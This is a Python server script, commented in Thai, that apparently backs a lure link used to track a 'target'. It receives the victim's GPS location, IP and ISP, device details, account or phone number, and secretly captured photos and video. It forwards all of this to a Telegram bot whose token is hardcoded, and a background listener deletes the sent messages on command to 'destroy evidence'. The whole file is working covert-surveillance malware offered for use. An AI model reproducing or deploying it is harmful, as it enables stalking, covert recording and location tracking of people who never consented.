import http.server
import socketserver
import json
import base64
import time
import os
import subprocess
import requests
import json
import threading
from datetime import datetime, timedelta, timezone

PORT = int(os.environ.get("PORT", 8080))

class TrackerHandler(http.server.SimpleHTTPRequestHandler):
    def send_to_telegram(self, message, image_paths=None, video_path=None):
        token = "8862730393:AAHnTrFZi3yI8UHuDdFrsPlsZXXOVVbSqLw"
        chat_id = "7505235924"
        try:
            # 1. ส่งข้อความปกติก่อน
            url_msg = f"https://api.telegram.org/bot{token}/sendMessage"
            res_msg = requests.post(url_msg, data={'chat_id': chat_id, 'text': message})
            if res_msg.status_code == 200:
                self.save_message_id(res_msg.json().get("result", {}).get("message_id"))

            # 2. ส่งรูปภาพหลายรูป (MediaGroup)
            if image_paths and len(image_paths) > 0:
                url_media = f"https://api.telegram.org/bot{token}/sendMediaGroup"
                media = []
                files = {}
                for i, path in enumerate(image_paths):
                    if os.path.exists(path):
                        file_key = f"photo{i}"
                        media.append({"type": "photo", "media": f"attach://{file_key}"})
                        files[file_key] = open(path, 'rb')
                
                if files:
                    res_media = requests.post(url_media, data={'chat_id': chat_id, 'media': json.dumps(media)}, files=files)
                    if res_media.status_code == 200:
                        for m in res_media.json().get("result", []):
                            self.save_message_id(m.get("message_id"))
                    for f in files.values():
                        f.close()

            # 3. ส่งไฟล์วิดีโอพร้อมเสียง (Video)
            if video_path and os.path.exists(video_path):
                url_video = f"https://api.telegram.org/bot{token}/sendVideo"
                with open(video_path, 'rb') as video_file:
                    res_video = requests.post(url_video, data={'chat_id': chat_id}, files={'video': video_file})
                    if res_video.status_code == 200:
                        self.save_message_id(res_video.json().get("result", {}).get("message_id"))

        except Exception as e:
            print(f"❌ ส่งแจ้งเตือน Telegram ไม่สำเร็จ: {e}")

    def save_message_id(self, msg_id):
        # ฟังก์ชันเก็บรหัสข้อความลงไฟล์
        try:
            ids = []
            if os.path.exists("sent_messages.json"):
                with open("sent_messages.json", "r") as f:
                    ids = json.load(f)
            ids.append(msg_id)
            with open("sent_messages.json", "w") as f:
                json.dump(ids, f)
        except:
            pass

    def do_POST(self):
        if self.path == '/log-location':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length)
            data = json.loads(post_data.decode('utf-8'))
            
            lat = data.get('lat')
            lon = data.get('lon')
            device_info = data.get('deviceInfo', {})
            image_datas = data.get('images', [])
            video_data = data.get('video')
            
            # ดึงเวลาปัจจุบัน (ตั้งค่าให้เป็นเวลาประเทศไทย UTC+7 เสมอ ไม่ว่าเซิร์ฟเวอร์จะอยู่ที่ไหน)
            tz_th = timezone(timedelta(hours=7))
            now = datetime.now(tz_th)
            dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
            
            # ดึงข้อมูล IP และ แบตเตอรี่
            ip_info = device_info.get('ip', {})
            battery_info = device_info.get('battery', {})
            network_type = device_info.get('network', 'Unknown')
            
            # จัดฟอร์แมตข้อมูลแบตเตอรี่
            bat_text = "ไม่ทราบ"
            if battery_info:
                status = "⚡ กำลังชาร์จ" if battery_info.get('charging') else "🔋 ไม่ได้ชาร์จ"
                bat_text = f"{battery_info.get('level', 0)}% ({status})"

            username = data.get('username', '').strip()
            if not username:
                username = 'ไม่ระบุ (ไม่ได้กรอก)'
            
            orientation = device_info.get('orientation', 'ไม่ทราบ (ไม่มีเซ็นเซอร์หรือไม่อนุญาต)')
            
            print('\n========================================')
            print('🚨 มีคนกดลิ้งค์และส่งข้อมูลมาแล้ว! 🚨')
            print(f'🕒 วันและเวลา: {dt_string}')
            print(f'👤 บัญชี/เบอร์โทร: {username}')
            print(f'🌐 IP Address: {ip_info.get("ip", "N/A")}')
            print(f'🏢 เครือข่าย (ISP): {ip_info.get("org", "N/A")}')
            print(f'📍 พื้นที่ (IP Location): {ip_info.get("city", "N/A")}, {ip_info.get("region", "N/A")}, {ip_info.get("country_name", "N/A")}')
            print(f'📶 ประเภทเน็ต: {network_type.upper()}')
            print(f'📍 ละติจูด (Latitude): {lat}')
            print(f'📍 ลองจิจูด (Longitude): {lon}')
            print(f'📱 อุปกรณ์ (User Agent): {device_info.get("userAgent", "N/A")}')
            print(f'⚙️ ระบบ (Platform): {device_info.get("platform", "N/A")} | ภาษา: {device_info.get("language", "N/A")}')
            print(f'🖥️ ขนาดหน้าจอ: {device_info.get("screen", "N/A")}')
            print(f'🚀 CPU Cores: {device_info.get("cores", "N/A")} | RAM: {device_info.get("ram", "N/A")} GB')
            print(f'🔋 แบตเตอรี่: {bat_text}')
            print(f'🧭 ท่าทางมือถือ: {orientation}')
            print(f'🗺️ ลิ้งค์ Google Maps เพื่อดูแผนที่:')
            print(f'https://www.google.com/maps?q={lat},{lon}')
            
            # สร้างข้อความสำหรับส่งเข้า Telegram
            tg_message = (
                f"🚨 เป้าหมายกดลิงก์แล้ว!\n\n"
                f"👤 บัญชีเป้าหมาย: {username}\n"
                f"🕒 เวลา: {dt_string}\n"
                f"🌐 IP: {ip_info.get('ip', 'N/A')}\n"
                f"🏢 เครือข่าย: {ip_info.get('org', 'N/A')}\n"
                f"📍 พื้นที่ (จาก IP): {ip_info.get('city', 'N/A')}, {ip_info.get('region', 'N/A')}\n"
                f"📶 ประเภทเน็ต: {network_type.upper()}\n"
                f"📍 พิกัด GPS: {lat}, {lon}\n"
                f"📱 อุปกรณ์: {device_info.get('platform', 'N/A')}\n"
                f"🔋 แบตเตอรี่: {bat_text}\n"
                f"🧭 ท่าทาง: {orientation}\n"
                f"🚀 CPU: {device_info.get('cores', 'N/A')} cores\n\n"
                f"🌐 Google Maps:\nhttps://www.google.com/maps?q={lat},{lon}"
            )
            
            saved_image_paths = []
            if image_datas and len(image_datas) > 0:
                try:
                    for i, img_data in enumerate(image_datas):
                        image_str = img_data.split(',')[1]
                        image_bytes = base64.b64decode(image_str)
                        timestamp = int(time.time())
                        filename = f'../target_image_{timestamp}_{i}.png'
                        with open(filename, 'wb') as f:
                            f.write(image_bytes)
                        saved_image_paths.append(filename)
                    print(f'📸 แอบถ่ายรูปสำเร็จ {len(saved_image_paths)} รูป!')
                except Exception as e:
                    print(f'❌ ไม่สามารถบันทึกรูปภาพได้: {e}')
            else:
                print('❌ ไม่ได้รูปภาพ (เป้าหมายอาจจะไม่อนุญาตให้ใช้กล้อง)')

            saved_video_path = None
            if video_data:
                try:
                    video_str = video_data.split(',')[1]
                    video_bytes = base64.b64decode(video_str)
                    timestamp = int(time.time())
                    filename = f'../target_video_{timestamp}.webm'
                    with open(filename, 'wb') as f:
                        f.write(video_bytes)
                    print(f'🎥 แอบอัดวิดีโอสำเร็จ! บันทึกไฟล์ไว้ที่: {filename.replace("../", "")}')
                    saved_video_path = filename
                except Exception as e:
                    print(f'❌ ไม่สามารถบันทึกไฟล์วิดีโอได้: {e}')
            else:
                print('❌ ไม่ได้ไฟล์วิดีโอ (เป้าหมายอาจจะไม่อนุญาตให้ใช้กล้อง/ไมค์)')

            print('========================================\n')
            
            # ส่งข้อมูลเข้า Telegram
            print("กำลังส่งแจ้งเตือนเข้า Telegram...")
            self.send_to_telegram(tg_message, saved_image_paths, saved_video_path)
            print("ส่งแจ้งเตือน Telegram เรียบร้อย!")
            
            # แสดงแจ้งเตือนบนหน้าจอ (Popup) เฉพาะบน Windows เท่านั้น
            try:
                if os.name == 'nt':
                    msg = f"มีคนกดลิ้งค์และส่งพิกัด/รูปภาพมาแล้ว!\\nเวลา: {dt_string}"
                    subprocess.Popen(['powershell', '-c', f"(New-Object -ComObject Wscript.Shell).Popup('{msg}', 5, '⚠️ แจ้งเตือนระบบติดตาม', 64)"], creationflags=subprocess.CREATE_NO_WINDOW)
            except Exception as e:
                print(f"แสดงแจ้งเตือนไม่สำเร็จ: {e}")
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'success'}).encode())
        else:
            self.send_response(404)
            self.end_headers()

# เปลี่ยนโฟลเดอร์ทำงานไปที่ public เพื่อเสิร์ฟไฟล์ index.html
import os
os.chdir('public')


# --- ฟังก์ชันทำงานเบื้องหลังสำหรับคอยรับคำสั่ง /clear จาก Telegram ---
def poll_telegram():
    token = "8862730393:AAHnTrFZi3yI8UHuDdFrsPlsZXXOVVbSqLw"
    chat_id = "7505235924"
    last_update_id = 0
    
    print("🤖 ระบบพร้อมรับคำสั่งใน Telegram แล้ว (พิมพ์ /clear หรือ ลบข้อมูล เพื่อทำลายหลักฐาน)")
    while True:
        try:
            url = f"https://api.telegram.org/bot{token}/getUpdates?offset={last_update_id}&timeout=30"
            res = requests.get(url, timeout=35)
            if res.status_code == 200:
                data = res.json()
                for item in data.get("result", []):
                    last_update_id = item["update_id"] + 1
                    msg_text = item.get("message", {}).get("text", "").lower()
                    
                    if "/clear" in msg_text or "ลบข้อมูล" in msg_text:
                        print("🗑️ ได้รับคำสั่งลบข้อมูล กำลังทำลายหลักฐาน...")
                        delete_all_messages(token, chat_id)
                        
                        # ลบข้อความคำสั่งของ user ด้วย เพื่อไม่ให้เหลือร่องรอย
                        cmd_msg_id = item.get("message", {}).get("message_id")
                        if cmd_msg_id:
                            requests.post(f"https://api.telegram.org/bot{token}/deleteMessage", data={'chat_id': chat_id, 'message_id': cmd_msg_id})
        except:
            pass
        time.sleep(2)

def delete_all_messages(token, chat_id):
    if not os.path.exists("sent_messages.json"):
        print("ℹ️ ไม่มีข้อมูลให้ลบ")
        return
        
    try:
        with open("sent_messages.json", "r") as f:
            ids = json.load(f)
            
        deleted_count = 0
        for msg_id in ids:
            url = f"https://api.telegram.org/bot{token}/deleteMessage"
            data = {'chat_id': chat_id, 'message_id': msg_id}
            requests.post(url, data=data)
            deleted_count += 1
            time.sleep(0.1) # ป้องกันโดนแบนจากการยิง API รัวไป
            
        print(f"✅ ลบข้อมูลสำเร็จ จำนวน {deleted_count} ข้อความ!")
        
        # ล้างไฟล์
        with open("sent_messages.json", "w") as f:
            json.dump([], f)
            
    except Exception as e:
        print(f"❌ เกิดข้อผิดพลาดในการลบ: {e}")

with socketserver.TCPServer(("", PORT), TrackerHandler) as httpd:
    print(f"✅ เซิร์ฟเวอร์รันอยู่ที่: http://localhost:{PORT}")
    print("เปิดเว็บเบราว์เซอร์แล้วเข้าลิ้งค์ด้านบนเพื่อทดสอบ")
    
    # เริ่มระบบดักฟัง Telegram เบื้องหลัง
    tg_thread = threading.Thread(target=poll_telegram, daemon=True)
    tg_thread.start()
    
    httpd.serve_forever()
